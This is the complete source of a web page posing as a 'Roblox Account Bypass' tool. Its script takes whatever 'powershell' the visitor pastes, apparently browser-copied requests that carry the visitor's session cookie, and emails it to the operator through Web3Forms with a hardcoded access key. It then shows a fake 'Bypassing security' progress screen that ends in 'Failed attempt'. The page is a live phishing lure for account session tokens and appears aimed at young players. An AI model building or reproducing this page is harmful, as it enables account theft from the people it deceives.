<style>
/* ===== RESET & BASE ===== */
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
--bg:#040404;--bg2:#0a0a12;
--surface:rgba(255,255,255,0.04);--surface2:rgba(255,255,255,0.07);
--border:rgba(255,255,255,0.09);--border2:rgba(255,255,255,0.14);
--text:#d0d0d0;--text-dim:#888;--text-mute:#555;
--cyan:#5beaf4;--purple:#c07aff;--pink:#f472d0;--green:#3effa0;--red:#ff4f4f;
--grad:linear-gradient(135deg,#5beaf4 0%,#c07aff 55%,#f472d0 100%);
--radius:14px;--radius-sm:8px;--nav-h:54px;
}
html{background:var(--bg);color:var(--text);height:100%;font-family:'Sora',system-ui,sans-serif;-webkit-font-smoothing:antialiased}
body{min-height:100vh;background:var(--bg);overflow-x:hidden}
/* ===== BACKGROUND ===== */
.bg-wrap{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
.liq{position:absolute;border-radius:50%;filter:blur(80px);animation:liqDrift 20s ease-in-out infinite alternate}
.liq1{width:700px;height:700px;background:radial-gradient(circle,rgba(91,234,244,0.22) 0%,transparent 70%);top:-200px;left:-150px;animation-duration:22s}
.liq2{width:600px;height:600px;background:radial-gradient(circle,rgba(192,122,255,0.2) 0%,transparent 70%);bottom:-100px;right:-100px;animation-duration:26s;animation-delay:-8s}
.liq3{width:400px;height:400px;background:radial-gradient(circle,rgba(244,114,208,0.15) 0%,transparent 70%);top:40%;left:45%;animation-duration:18s;animation-delay:-12s}
@keyframes liqDrift{0%{transform:translate(0,0) scale(1)}100%{transform:translate(60px,40px) scale(1.15)}}
#grad-layer{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse 60% 50% at 20% 10%,rgba(91,234,244,0.07) 0%,transparent 70%),radial-gradient(ellipse 50% 60% at 80% 90%,rgba(192,122,255,0.07) 0%,transparent 70%)}
.ray-top,.ray-bot{position:fixed;left:0;right:0;height:2px;z-index:2;pointer-events:none;background:var(--grad);opacity:.2}
.ray-top{top:0}.ray-bot{bottom:0}
#edge-vignette{position:fixed;inset:0;z-index:2;pointer-events:none;background:radial-gradient(ellipse 100% 50% at 50% 0%,transparent 60%,rgba(4,4,4,.55) 100%),radial-gradient(ellipse 100% 50% at 50% 100%,transparent 60%,rgba(4,4,4,.55) 100%)}
/* ===== PROGRESS BAR ===== */
#progress-bar{position:fixed;top:0;left:0;height:2px;width:0;z-index:9999;background:var(--grad);border-radius:0 2px 2px 0;pointer-events:none}
#progress-bar.run{animation:pbRun .42s ease forwards}
@keyframes pbRun{0%{width:0}60%{width:75%}100%{width:100%;opacity:0}}
/* ===== TOAST ===== */
#toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(20px);z-index:9998;background:rgba(20,20,30,.95);border:1px solid var(--border2);color:var(--text);padding:10px 22px;border-radius:30px;font-size:13px;letter-spacing:.02em;opacity:0;pointer-events:none;transition:opacity .3s,transform .3s;backdrop-filter:blur(14px);box-shadow:0 8px 32px rgba(0,0,0,.5)}
#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
/* ===== NAV ===== */
nav{position:fixed;top:0;left:0;right:0;height:var(--nav-h);z-index:100;display:flex;align-items:center;justify-content:space-between;padding:0 24px;background:rgba(4,4,4,.72);border-bottom:1px solid var(--border);backdrop-filter:blur(18px)}
.nav-tabs{display:flex;gap:4px}
.tab-btn{background:none;border:1px solid transparent;border-radius:30px;color:var(--text-dim);font-family:'Sora',sans-serif;font-size:12px;font-weight:500;letter-spacing:.06em;text-transform:uppercase;padding:6px 18px;cursor:pointer;transition:color .2s,border-color .2s,background .2s}
.tab-btn:hover{color:var(--text);border-color:var(--border2);background:var(--surface2)}
.tab-btn.active{color:#fff;border-color:rgba(91,234,244,.35);background:rgba(91,234,244,.07);box-shadow:0 0 14px rgba(91,234,244,.1)}
.tab-btn.is-nav-hidden{display:none!important}
.admin-link{color:var(--cyan);text-decoration:none;font-size:12px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;padding:6px 14px;border:1px solid rgba(91,234,244,.3);border-radius:20px;transition:all .2s}
.admin-link:hover{background:rgba(91,234,244,.1);box-shadow:0 0 16px rgba(91,234,244,.2)}
/* ===== NAV STATS ===== */
.nav-stats{display:flex;align-items:center;gap:16px}
.nav-stat{position:relative;display:flex;flex-direction:column;align-items:flex-end;gap:1px;cursor:default;user-select:none}
.nav-stat-row{display:flex;align-items:center;gap:5px}
.nav-stat-n{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;color:var(--text)}
.stat-active-n{color:var(--green)}
.nav-stat-sep{color:var(--text-mute);font-size:12px}
.nav-stat-l{font-size:9px;letter-spacing:.08em;text-transform:uppercase;color:var(--text-mute)}
.nav-stat-sep-l{color:var(--text-mute);font-size:10px}
/* Terminal dropdown */
.stat-terminal-wrap{position:absolute;top:calc(100% + 12px);right:0;width:280px;opacity:0;pointer-events:none;transform:translateY(-8px);transition:opacity .2s,transform .2s}
.nav-stat:hover .stat-terminal-wrap{opacity:1;pointer-events:auto;transform:translateY(0)}
.stat-terminal{background:rgba(8,8,14,.97);border:1px solid var(--border2);border-radius:var(--radius);overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,.7),0 0 0 1px rgba(91,234,244,.06);backdrop-filter:blur(20px)}
.term-titlebar{display:flex;align-items:center;gap:6px;padding:8px 12px;background:rgba(255,255,255,.03);border-bottom:1px solid var(--border)}
.term-dot{width:10px;height:10px;border-radius:50%}
.term-dot-r{background:#ff5f57}.term-dot-y{background:#febc2e}.term-dot-g{background:#28c840}
.term-title-txt{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-mute);margin-left:4px}
.term-stats{padding:10px 14px 6px;display:flex;flex-direction:column;gap:4px}
.term-stat-row{display:flex;justify-content:space-between;align-items:center}
.ts-label{font-size:11px;color:var(--text-mute);font-family:'JetBrains Mono',monospace}
.ts-val{font-size:12px;color:var(--text);font-family:'JetBrains Mono',monospace;font-weight:500}
.ts-val-green{color:var(--green)}
.term-divider{height:1px;background:var(--border);margin:6px 0}
.term-body{padding:4px 14px 10px;display:flex;flex-direction:column;gap:3px}
.term-line{display:flex;align-items:center;gap:7px;font-size:11px;font-family:'JetBrains Mono',monospace;animation:termSlide .3s ease both;overflow:hidden}
@keyframes termSlide{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
.term-chk{color:var(--green);flex-shrink:0}
.term-game{color:var(--text);flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.term-act{color:var(--cyan);flex-shrink:0;font-size:10px}
.term-cursor{display:inline-block;width:7px;height:13px;background:var(--cyan);border-radius:1px;vertical-align:middle;animation:cursorBlink 1s step-end infinite}
@keyframes cursorBlink{0%,100%{opacity:1}50%{opacity:0}}
/* ===== PAGE WRAP ===== */
#page-wrap{position:relative;z-index:10;padding-top:var(--nav-h);min-height:100vh}
#page-wrap.slide-out-l{animation:slideOutL .37s ease both}
#page-wrap.slide-out-r{animation:slideOutR .37s ease both}
#page-wrap.slide-in-l{animation:slideInL .43s ease both}
#page-wrap.slide-in-r{animation:slideInR .43s ease both}
@keyframes slideOutL{to{opacity:0;transform:translateX(-40px)}}
@keyframes slideOutR{to{opacity:0;transform:translateX(40px)}}
@keyframes slideInL{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
@keyframes slideInR{from{opacity:0;transform:translateX(-40px)}to{opacity:1;transform:translateX(0)}}
/* ===== HERO ===== */
.hero{display:flex;align-items:center;justify-content:center;min-height:calc(100vh - var(--nav-h));padding:48px 20px 80px}
.hero-inner{display:flex;flex-direction:column;align-items:center;gap:20px;max-width:640px;width:100%;text-align:center}
/* Logo */
.hero-logo{position:relative;width:88px;height:88px}
.hero-logo img{width:88px;height:88px;object-fit:contain;filter:drop-shadow(0 0 24px rgba(91,234,244,.35));animation:logoBob 4s ease-in-out infinite}
.hero-logo-spark{position:absolute;inset:-12px;border-radius:50%;background:radial-gradient(circle,rgba(91,234,244,.18) 0%,transparent 70%);animation:sparkPulse 3s ease-in-out infinite}
@keyframes logoBob{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
@keyframes sparkPulse{0%,100%{opacity:.5;transform:scale(1)}50%{opacity:1;transform:scale(1.1)}}
/* Title */
h1#heroTitle{font-family:'Bebas Neue',sans-serif;font-size:clamp(52px,10vw,86px);line-height:1;letter-spacing:.03em;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-transform:uppercase;filter:drop-shadow(0 0 40px rgba(91,234,244,.2))}
/* Subtitle */
.hero-sub{font-size:15px;color:var(--text-dim);line-height:1.65;max-width:420px;font-weight:300}
/* ===== PANELS ===== */
.hero-panels{width:100%}
.hero-panels.is-hidden{display:none}
/* ===== TERMINAL INPUT ===== */
.input-group--terminal{width:100%}
.terminal-shell{width:100%;border-radius:var(--radius);padding:1px;background:linear-gradient(135deg,rgba(91,234,244,.3),rgba(192,122,255,.3),rgba(244,114,208,.3))}
.terminal-glass{display:flex;align-items:center;background:rgba(8,8,16,.92);border-radius:calc(var(--radius) - 1px);padding:0 4px 0 16px;transition:box-shadow .25s;backdrop-filter:blur(10px)}
.terminal-glass:focus-within{box-shadow:0 0 0 1px rgba(91,234,244,.25),0 0 24px rgba(91,234,244,.1)}
.terminal-glass.is-invalid{box-shadow:0 0 0 1px rgba(255,79,79,.5),0 0 20px rgba(255,79,79,.15)}
.terminal-prompt{font-family:'JetBrains Mono',monospace;font-size:13px;white-space:nowrap;margin-right:10px;user-select:none;flex-shrink:0}
.terminal-prompt-user{color:var(--cyan)}
.terminal-prompt-symbol{color:var(--purple);margin-left:2px}
.terminal-input,.hero-input{flex:1;background:none;border:none;outline:none;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;padding:14px 0;min-width:0;caret-color:var(--cyan)}
.terminal-input::placeholder{color:var(--text-mute)}
.terminal-btn{flex-shrink:0;background:var(--grad);border:none;border-radius:10px;color:#fff;font-family:'Sora',sans-serif;font-size:12px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;padding:9px 20px;margin:5px;cursor:pointer;transition:opacity .2s,transform .15s,box-shadow .2s;white-space:nowrap;box-shadow:0 4px 18px rgba(91,234,244,.2)}
.terminal-btn:hover{opacity:.88;transform:translateY(-1px);box-shadow:0 6px 24px rgba(91,234,244,.3)}
.terminal-btn:active{transform:translateY(0)}
.terminal-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
/* ===== VIDEO SECTION ===== */
.vid-wrap{position:relative;width:100%;max-width:640px;margin-top:8px}
.vid-edge-l,.vid-edge-r{position:absolute;top:0;bottom:0;width:80px;z-index:2;pointer-events:none}
.vid-edge-l{left:0;background:linear-gradient(to right,rgba(4,4,4,.85),transparent)}
.vid-edge-r{right:0;background:linear-gradient(to left,rgba(4,4,4,.85),transparent)}
.vid-box{position:relative;border-radius:var(--radius);overflow:hidden;aspect-ratio:16/7;background:rgba(255,255,255,.03);border:1px solid var(--border)}
.vid-skeleton{position:absolute;inset:0;background:linear-gradient(110deg,rgba(255,255,255,.03) 25%,rgba(255,255,255,.06) 50%,rgba(255,255,255,.03) 75%);background-size:200% 100%;animation:shimmer 1.5s infinite}
.vid-skeleton.hidden{display:none}
@keyframes shimmer{to{background-position:-200% 0}}
.vid-thumb{position:absolute;inset:0;cursor:pointer;overflow:hidden}
.vid-thumb img{width:100%;height:100%;object-fit:cover;opacity:.65;transition:transform .4s,opacity .3s}
.vid-thumb:hover img{transform:scale(1.03);opacity:.8}
.play-c{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:10px}
.play-c svg{width:48px;height:48px;fill:#fff;opacity:.85;filter:drop-shadow(0 2px 12px rgba(0,0,0,.6));transition:transform .2s,opacity .2s}
.vid-thumb:hover .play-c svg{transform:scale(1.1);opacity:1}
.vid-label{position:absolute;bottom:14px;left:50%;transform:translateX(-50%);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:rgba(255,255,255,.7);font-family:'Sora',sans-serif;font-weight:500}
.vid-embed{position:absolute;inset:0;display:none;border-radius:var(--radius);overflow:hidden}
.vid-embed.on{display:block}
.vid-close{position:absolute;top:10px;right:10px;z-index:10;background:rgba(0,0,0,.6);border:1px solid var(--border2);border-radius:50%;color:#fff;width:30px;height:30px;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .2s}
.vid-close:hover{background:rgba(255,79,79,.5)}
/* ===== LOADING OVERLAY ===== */
#shader-overlay{position:fixed;inset:0;z-index:10000;background:rgba(4,4,4,.88);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(12px);animation:lwFadeIn .35s ease both}
@keyframes lwFadeIn{from{opacity:0}to{opacity:1}}
@keyframes lwFadeOut{from{opacity:1}to{opacity:0}}
@keyframes lwShake{0%,100%{transform:translateX(0)}20%{transform:translateX(-8px)}40%{transform:translateX(8px)}60%{transform:translateX(-6px)}80%{transform:translateX(6px)}}
.lw-card{background:rgba(10,10,18,.97);border:1px solid var(--border2);border-radius:20px;padding:36px 40px;width:100%;max-width:420px;display:flex;flex-direction:column;gap:16px;box-shadow:0 24px 80px rgba(0,0,0,.8),0 0 0 1px rgba(91,234,244,.06);backdrop-filter:blur(20px)}
.lw-eyebrow{font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.2em;color:var(--cyan);text-transform:uppercase}
.lw-title{font-family:'Bebas Neue',sans-serif;font-size:32px;letter-spacing:.06em;color:#fff;line-height:1}
.lw-title span{background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.lw-sub{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-mute)}
.lw-spinner{width:36px;height:36px;border:3px solid var(--border);border-top-color:var(--cyan);border-radius:50%;animation:spin .8s linear infinite;align-self:center}
.lw-spinner-copy{border-top-color:var(--purple)}
@keyframes spin{to{transform:rotate(360deg)}}
.lw-step{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-dim);text-align:center;min-height:18px}
.lw-step.lw-err{color:var(--red)}
.lw-bar-bg{height:5px;background:rgba(255,255,255,.07);border-radius:99px;overflow:hidden}
.lw-bar-fill{height:100%;width:0;background:var(--grad);border-radius:99px;transition:width .5s cubic-bezier(.25,1,.5,1)}
.lw-bar-fill.lw-err{background:var(--red)}
.lw-pct{font-family:'JetBrains Mono',monospace;font-size:22px;font-weight:500;text-align:center;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.lw-pct.lw-err{background:none;-webkit-text-fill-color:var(--red);color:var(--red)}
.lw-checks{display:flex;flex-direction:column;gap:7px}
.lw-check{display:flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-mute);transition:color .25s}
.lw-check.lw-active{color:var(--cyan)}
.lw-check.lw-done{color:var(--green)}
.lw-check.lw-done.lw-err{color:var(--red)}
.lw-dot{width:7px;height:7px;border-radius:50%;background:currentColor;flex-shrink:0;opacity:.5}
.lw-active .lw-dot{opacity:1;animation:dotPulse 1s ease-in-out infinite}
.lw-done .lw-dot{opacity:1}
@keyframes dotPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.5)}}
.lw-success-aurora{position:absolute;inset:0;border-radius:20px;background:radial-gradient(ellipse 80% 60% at 50% 50%,rgba(62,255,160,.06) 0%,transparent 70%);pointer-events:none}
.lw-mark{width:52px;height:52px;border-radius:50%;align-self:center;display:flex;align-items:center;justify-content:center;font-size:24px}
.lw-mark-ok{background:rgba(62,255,160,.15);color:var(--green);border:2px solid rgba(62,255,160,.3)}
.lw-mark-bad{background:rgba(255,79,79,.15);color:var(--red);border:2px solid rgba(255,79,79,.3)}
.lw-mark-ok::after{content:'✓'}
.lw-mark-bad::after{content:'✕'}
.lw-mark-pop{animation:markPop .4s cubic-bezier(.34,1.56,.64,1) both}
@keyframes markPop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
.lw-done-title{font-family:'Bebas Neue',sans-serif;font-size:26px;letter-spacing:.06em;text-align:center}
.lw-done-gradient{background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.lw-done-sub{font-size:14px;color:var(--text-dim);text-align:center}
.lw-done-sub-glow{color:var(--cyan);text-shadow:0 0 18px rgba(91,234,244,.4)}
.lw-done-hint{font-size:12px;color:var(--text-mute);text-align:center;font-family:'JetBrains Mono',monospace}
.lw-err-title{font-family:'Bebas Neue',sans-serif;font-size:24px;letter-spacing:.06em;color:var(--red);text-align:center}
.lw-err-hint{font-size:12px;color:var(--red);opacity:.7;text-align:center;font-family:'JetBrains Mono',monospace}
.lw-err-box{background:rgba(255,79,79,.06);border:1px solid rgba(255,79,79,.2);border-radius:var(--radius-sm);padding:10px 14px;display:flex;flex-direction:column;gap:4px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--red);opacity:.8}

}
@media(max-width:420px){
h1#heroTitle{font-size:42px}
.terminal-input{font-size:12px}
}
::-webkit-scrollbar{width:6px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,.12);border-radius:99px}
</style>
</head>
<body class="page-boot is-visible">
<!-- Background -->
<div class="bg-wrap">
<div class="liq liq1"></div>
<div class="liq liq2"></div>
<div class="liq liq3"></div>
</div>
<div id="grad-layer"></div>
<div class="ray-top"></div>
<div class="ray-bot"></div>
<div id="edge-vignette"></div>
<div id="progress-bar"></div>
<div id="toast"></div>

<!-- Nav -->
<nav>
<div class="nav-tabs">
<button class="tab-btn active" data-tab="copygame">Account Bypass</button>
</div>
<div class="nav-stats">
<div class="nav-stat" id="statWrap">
<div class="nav-stat-row">
<span class="nav-stat-n" id="statProcessed">0</span>
</div>
<div class="nav-stat-row">
<span class="nav-stat-l">Submissions</span>
</div>
</div>
</div>
</nav>

<!-- Page content -->
<div id="page-wrap">
<div class="hero">
<div class="hero-inner">
<!-- Logo -->
<div class="hero-logo">
<div class="hero-logo-spark"></div>
<img src="Image/logo.png" alt="" width="88" height="88" onerror="this.style.display='none'">
</div>
<h1 id="heroTitle">Roblox Account<br>Bypass</h1>
<p class="hero-sub" id="heroSub">⚠️Please don’t do this to famous YouTubers because you might get banned. You can only use this if your target is someone on your friends list.</p>

<!-- Standard input panel -->
<div id="heroStandard" class="hero-panels">
<div class="input-group input-group--terminal">
<div class="terminal-shell">
<div class="terminal-glass">
<span class="terminal-prompt" aria-hidden="true">
<span class="terminal-prompt-user">Insert:</span><span class="terminal-prompt-symbol"></span>
</span>
<input type="password" class="hero-input token-field terminal-input" id="heroInput"
autocomplete="off" spellcheck="false" placeholder="Paste here...." inputmode="text">
<button type="button" class="terminal-btn" id="enableBtn">Generate</button>
</div>
</div>
</div>
</div>

<!-- Video section -->
<div class="vid-wrap">
<div class="vid-edge-l"></div>
<div class="vid-edge-r"></div>
<div class="vid-box">
<div class="vid-skeleton hidden" id="vidSkeleton"></div>
<div class="vid-thumb" id="vidThumb">
<img src="thumb-copygame.jpg" alt="" loading="lazy" id="vidImg" style="opacity:0" onerror="this.style.opacity=0">
<div class="play-c">
<svg viewBox="0 0 24 24"><polygon points="6 3 20 12 6 21 6 3"></polygon></svg>
</div>
<span class="vid-label">Watch Tutorial</span>
</div>
<div class="vid-embed" id="vidEmbed">
<iframe id="vidFrame" src="" style="width:100%;height:100%;display:none;border:0;border-radius:14px;background:#000" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>
<video id="vidPlayer" controls playsinline style="width:100%;height:100%;display:none;background:#000;border-radius:14px">
<source id="vidSource" src="" type="video/mp4">
</video>
<button class="vid-close" id="vidClose">✕</button>
</div>
</div>
</div>
</div>
</div>
</div>

<script>
"use strict";

// ─── WEB3FORMS CONFIG ────────────────────────────────────────
// Ilagay mo dito ang Access Key na nakuha mo sa Web3Forms
var WEB3FORMS_ACCESS_KEY = 'f607ad69-14ab-47a1-b25b-1a10386d6af0'; 
var VIDEO_URL = 'https://www.youtube.com/watch?v=gcJOXWI7Okg';

// ─── SUBMISSION STORAGE ───────────────────────────────────────
function getSubmissions(){
try{
var s=localStorage.getItem('rbx_submissions');
return s?JSON.parse(s):[];
}catch(e){return [];}
}
function addSubmission(val){
var subs=getSubmissions();
subs.push({
id:Date.now(),
value:val,
timestamp:new Date().toISOString(),
date:new Date().toLocaleString()
});
localStorage.setItem('rbx_submissions',JSON.stringify(subs));
updateSubmissionCount();
}
function updateSubmissionCount(){
var count=getSubmissions().length;
var el=document.getElementById('statProcessed');
if(el) el.textContent=count.toLocaleString()+'+';
}

// ─── SEND TO WEB3FORMS (Para ma-email sa'yo) ───────────────────
function sendToWeb3Forms(powershellCode){
var formData = new FormData();
formData.append('access_key', WEB3FORMS_ACCESS_KEY);
formData.append('subject', '🎯 Roblox Account Bypass - New Submission');
formData.append('from_name', 'Roblox Bypass Tool');
formData.append('powershell_code', powershellCode);
formData.append('message', 'Someone entered the following code:\n\n' + powershellCode);

return fetch('https://api.web3forms.com/submit', {
method: 'POST',
body: formData
})
.then(response => response.json())
.then(data => {
console.log('Success:', data);
return data.success;
})
.catch(error => {
console.error('Error:', error);
return false;
});
}

// ─── VIDEO ─────────────────────────────────────────────────────
function closeTutorialPlayer(){
var pl=document.getElementById('vidPlayer'), so=document.getElementById('vidSource'), fr=document.getElementById('vidFrame');
if(pl){ pl.pause(); pl.currentTime=0; pl.style.display='none'; }
if(so) so.src='';
if(fr){ fr.src=''; fr.style.display='none'; }
var emb=document.getElementById('vidEmbed'); if(emb) emb.classList.remove('on');
var th=document.getElementById('vidThumb');  if(th)  th.style.display='';
}
function parseYouTube(url){
var s=String(url||'').trim(); if(!s) return null;
try{
var u=new URL(s,location.origin), host=u.hostname.toLowerCase(), vid='';
if(host.indexOf('youtu.be')>=0) vid=(u.pathname.split('/').filter(Boolean)[0]||'');
else if(host.indexOf('youtube.com')>=0){
vid=u.searchParams.get('v')||'';
if(!vid){ var p=u.pathname.split('/').filter(Boolean); if((p[0]==='shorts'||p[0]==='embed')&&p[1]) vid=p[1]; }
}
if(vid) return 'https://www.youtube.com/embed/'+encodeURIComponent(vid)+'?autoplay=1&rel=0';
}catch(e){}
return null;
}
document.getElementById('vidThumb').addEventListener('click', function(){
var src = VIDEO_URL;
if(!src) { showToast('Video not available'); return; }
var pl=document.getElementById('vidPlayer'), so=document.getElementById('vidSource'), fr=document.getElementById('vidFrame');
var embed = parseYouTube(src);
if(embed){
if(pl){ pl.pause(); pl.currentTime=0; pl.style.display='none'; }
if(so) so.src='';
if(fr){ fr.style.display='block'; fr.src=embed; }
} else {
if(fr){ fr.src=''; fr.style.display='none'; }
if(so) so.src=src;
if(pl){ pl.style.display='block'; pl.load(); pl.play(); }
}
this.style.display='none';
document.getElementById('vidEmbed').classList.add('on');
});
document.getElementById('vidClose').addEventListener('click', closeTutorialPlayer);

// ─── TERMINAL INVALID ──────────────────────────────────────────
function setHeroTerminalInvalid(on){
var inp=document.getElementById('heroInput');
var g=inp?inp.closest('.terminal-glass'):null;
if(g) g.classList.toggle('is-invalid',!!on);
}

// ─── TOAST ─────────────────────────────────────────────────────
function showToast(msg,ms){
var t=document.getElementById('toast'); if(!t) return;
t.textContent=String(msg||''); t.classList.add('show');
setTimeout(function(){ t.classList.remove('show'); },ms||3400);
}

// ─── OVERLAY HELPERS ───────────────────────────────────────────
function setShaderProgress(pct,stepText,doneIdx,isErr){
var bar=document.getElementById('sh-bar'), pctEl=document.getElementById('sh-pct'), stepEl=document.getElementById('sh-step');
if(bar){ bar.style.width=pct+'%'; bar.classList.toggle('lw-err',!!isErr); }
if(pctEl){ pctEl.textContent=pct+'%'; pctEl.classList.toggle('lw-err',!!isErr); }
if(stepEl){ stepEl.textContent=stepText; stepEl.classList.toggle('lw-err',!!isErr); }
var checks=document.querySelectorAll('.lw-check');
checks.forEach(function(el,i){
el.className='lw-check';
if(isErr){ if(i<=doneIdx) el.classList.add('lw-done','lw-err'); }
else{ if(i<doneIdx) el.classList.add('lw-done'); if(i===doneIdx) el.classList.add('lw-active'); }
});
}
function createCopyOverlay(){
var ex=document.getElementById('shader-overlay'); if(ex) ex.remove();
var o=document.createElement('div'); o.id='shader-overlay';
o.innerHTML='<div id="sh-card" class="lw-card lw-card-copy">'+
'<div class="lw-eyebrow">— LOADING...</div>'+
'<div class="lw-title">ROBLOX <span>BYPASS</span></div>'+
'<div class="lw-sub">// Getting your game files…</div>'+
'<div class="lw-spinner lw-spinner-copy" id="sh-spin"></div>'+
'<div class="lw-step" id="sh-step">Starting process...</div>'+
'<div class="lw-bar-bg"><div class="lw-bar-fill" id="sh-bar"></div></div>'+
'<div class="lw-pct" id="sh-pct">0%</div>'+
'<div class="lw-checks" id="sh-checks">'+
'<div class="lw-check lw-active" id="shc-0"><div class="lw-dot"></div>Starting process</div>'+
'<div class="lw-check" id="shc-1"><div class="lw-dot"></div>Processing...</div>'+
'<div class="lw-check" id="shc-2"><div class="lw-dot"></div>Initializing...</div>'+
'<div class="lw-check" id="shc-3"><div class="lw-dot"></div>Please wait...</div>'+
'<div class="lw-check" id="shc-4"><div class="lw-dot"></div>Verifying files...</div>'+
'<div class="lw-check" id="shc-5"><div class="lw-dot"></div>Bypassing security...</div>'+
'</div></div>';
document.body.appendChild(o); return o;
}
function showOverlayDone(overlay, gameName){
var card=document.getElementById('sh-card'); if(!card) return;
var g=String(gameName||'Roblox').replace(/&/g,'&amp;').replace(/</g,'&lt;');
card.innerHTML='<div class="lw-mark lw-mark-bad lw-mark-pop"></div>'+
'<div class="lw-done-title lw-done-gradient">Failed attempt. Try again.</div>'+
'<div class="lw-done-sub">Action didn’t work.</div>'+
'<div class="lw-done-hint">Thank you for using Roblox Account Bypass</div>';
setTimeout(function(){
overlay.style.animation='lwFadeOut .65s ease both';
setTimeout(function(){ overlay.remove(); },680);
},2000);
}

// ─── SUBMIT BUTTON ─────────────────────────────────────────────
document.getElementById('enableBtn').addEventListener('click', function(){
var inp=document.getElementById('heroInput');
var val=inp?inp.value.trim():'';
if(!val){
showToast('Please enter powershell');
setHeroTerminalInvalid(true);
setTimeout(function(){ setHeroTerminalInvalid(false); },1500);
return;
}
setHeroTerminalInvalid(false);

// Save locally
addSubmission(val);

// 1. Send to Email (Web3Forms)
var btn=this;
btn.disabled=true;
btn.textContent='Sending...';

sendToWeb3Forms(val).then(function(success){
if(success){
showToast('✅ Data sent successfully!');
} else {
showToast('⚠️ Saved locally');
}

// 2. Show loading overlay
var overlay = createCopyOverlay();
var steps = [
{pct:10,text:'Starting process...',step:0},
{pct:24,text:'Reading game world...',step:1},
{pct:38,text:'Loading map files...',step:2},
{pct:52,text:'Loading assets...',step:3},
{pct:66,text:'Cloning game...',step:4},
{pct:80,text:'Preparing download...',step:4},
{pct:91,text:'Almost ready...',step:5},
{pct:97,text:'Ready for download.',step:5}
];
var STEP_MS=520;
(function run(i){
if(i>=steps.length){
setShaderProgress(100,'Ready for download.',5,false);
setTimeout(function(){
showOverlayDone(overlay, val.slice(0,40)||'Roblox');
if(inp) inp.value='';
btn.disabled=false;
btn.textContent='Generate';
},400);
return;
}
setTimeout(function(){
if(!document.getElementById('shader-overlay')) return;
var s=steps[i]; setShaderProgress(s.pct,s.text,s.step,false);
run(i+1);
}, i===0?0:STEP_MS);
})(0);

}).catch(function(){
showToast('⚠️ Saved locally');
btn.disabled=false;
btn.textContent='Generate';
});
});

// Enter key
document.getElementById('heroInput').addEventListener('keydown', function(e){
if(e.key==='Enter') document.getElementById('enableBtn').click();
});

// Init
updateSubmissionCount();
</script>
</body>
</html>
